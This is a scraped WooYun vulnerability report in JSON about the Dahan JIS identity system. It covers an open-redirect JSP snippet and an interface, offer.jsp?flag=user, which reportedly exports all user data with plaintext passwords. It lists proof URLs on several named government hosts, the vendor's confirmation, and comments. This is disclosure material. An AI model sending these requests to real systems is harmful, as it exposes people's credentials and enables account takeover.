{"id": 4429, "wybug_id": "wooyun-2014-050262", "wybug_title": "大汉版通JIS统一身份认证系统某处泄漏用户密码及一处跳转漏洞", "wybug_corp": "南京大汉网络有限公司", "wybug_author": "wefgod", "wybug_date": "2014-02-04 18:32", "wybug_open_date": "2014-05-05 18:33", "wybug_type": "敏感信息泄露", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["明文密码", "应用敏感信息泄漏"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-02-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-02-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-02-12：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-04-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-04-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-04-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-05-05：\t细节向公众公开  简要描述： 可获取所有用户的用户信息（包含密码），另外附送一个跳转的漏洞。 详细说明：  获取用户密码的问题主要是产生在接口上的，这接口过于开放了……跳转就没什么可说的了。先发跳转：<%\tHttpSession sessions = request.getSession(); \tString url = request.getParameter(\"url\"); //url参数\tsessions.setAttribute(\"loginid1\", \"\");\tsessions.setAttribute(\"username\", \"\");\tsessions.setAttribute(\"loginpass1\", \"\");\tresponse.sendRedirect(url);  //跳转%>http://management.ysx.gov.cn/jis/check/zx.jsp?url=http://www.baidu.com自定义url参数即可。   漏洞证明：  接口的问题产生在jis/interface/offer.jsphttp://management.ysx.gov.cn/jis/interface/offer.jsp?flag=user\n\n所以加上参数flag=user即可导出所有用户的信息了\n\nhttp://www.yuqing.gov.cn/jis/interface/offer.jsp?flag=user\n\nhttp://www.haiyan.gov.cn/jis/interface/offer.jsp?flag=user\n\nhttp://yqxsz.gov.cn/jis/interface/offer.jsp?flag=user等   修复方案：  跳转还是做一个白名单或者用相对路径了，接口的就没什么可说了   版权声明：转载请注明来源 wefgod@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-02-09 09:20 厂商回复： 非常感谢您对大汉产品的关注以及对产品安全方面的指正，涉及问题已在新版本中修复。 最新状态： 2014-02-14：涉及问题已在新版本中修复。  ", "replys": "漏洞评价：\n评论\n     2014-02-04 20:20 |    \t\txcoder \t\t\t( 实习白帽子  |\t\t\t        Rank:59 漏洞数:9        | 一个世界有你，一个世界没有你，让两者的不...)\t\t \n  应该是登录之后用户管理然后抓包把，里面有明文！    \n     2014-02-04 22:32 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @xcoder 否。如果是那种漏洞加上一个跳转，管理不会通过的    \n     2014-02-05 00:12 |    \t\txcoder \t\t\t( 实习白帽子  |\t\t\t        Rank:59 漏洞数:9        | 一个世界有你，一个世界没有你，让两者的不...)\t\t \n  @wefgod 那就不清楚了，坐等公开！    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}